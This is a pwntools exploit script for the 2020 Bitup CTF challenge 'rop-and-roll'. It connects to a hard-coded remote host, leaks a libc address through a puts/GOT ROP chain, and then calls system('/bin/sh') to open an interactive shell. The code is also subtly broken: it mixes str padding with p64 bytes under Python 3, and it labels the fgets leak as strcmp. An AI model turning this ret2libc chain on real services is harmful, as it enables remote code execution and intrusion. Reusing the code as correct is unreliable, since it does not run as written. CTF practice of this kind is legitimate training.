from pwn import *

# --- Info ---
# CTF: Bitup
# Date: 23 Oct 2020
# Challenge: rop-and-roll
# Description: Basic ret2libc
# --- End Info ---

#context.log_level = 'debug'
context.terminal = ["tmux", "sp", "-h"]
context.endian = 'little'

REMOTE = 1

HOST = '167.99.252.86'
PORT = 8002
PATH = './rop-and-roll'
LIBC = './libc.so.6'

x = ELF(PATH)
y = x.libc#ELF(PATH)

main = 0x00000000004011b4
pop_rdi = 0x00000000004012db
pop_rsi_r15 = 0x00000000004012d9 
puts_got = 0x404020
puts_plt = 0x401040

def pad(addr):
    return 0 if (len(addr) > 8) else addr + '\x00'*(8-len(addr))
    
if REMOTE:
    print(f'[*] Connecting to {HOST}:{str(PORT)}')
else:
    print(f'[*] Initializing target process: {PATH}')

r = remote(HOST, PORT) if REMOTE else process(PATH)
offset = 57

print('[*] Sending initial cmd...')

r.recvuntil('hear it\n')

cmd = '' + 'DEBUG-SYSTEM'
r.sendline(cmd)

print('[*] Sending leak payload...')

r.recvuntil('ERROR\n')

#gdb.attach(r)

leak = ''
leak += 'A'*(offset-1)
leak += 'B'*(0x8)
leak += 'B'*(0x8)
leak += p64(pop_rdi)
leak += p64(x.got['fgets'])
leak += p64(puts_plt)
leak += p64(main)

r.sendline(leak)

addr = u64(pad(r.recvuntil('\n')[:-1]))

libc_base = addr - 0x000000000007eb90
system_addr = libc_base + 0x000000000004f4e0
bin_sh_addr = libc_base + 0x1b40fa
puts_addr = libc_base + 0x0000000000080a30

print(f'[*] Leak: strcmp @ {hex(addr)}')
print(f'[*] Leak: libc base @ {hex(libc_base)}')
print(f'[*] Leak: system @ {hex(system_addr)}')
print('[*] Leak: /bin/sh\\x00 @ ' + hex(bin_sh_addr))

print('[*] Sending initial cmd...')

r.recvuntil('hear it\n')

cmd = '' + 'DEBUG-SYSTEM'
r.sendline(cmd)

print('[*] Sending payload...')

r.recvuntil('ERROR\n')

payload = ''
payload += 'A'*((offset+0x8)-1)
payload += 'B'*(0x8)
payload += p64(pop_rdi)
payload += p64(bin_sh_addr)
payload += p64(puts_addr)
payload += p64(pop_rdi)
payload += p64(bin_sh_addr)
payload += p64(system_addr)
payload += p64(main)

r.sendline(payload)

r.interactive()
r.close()
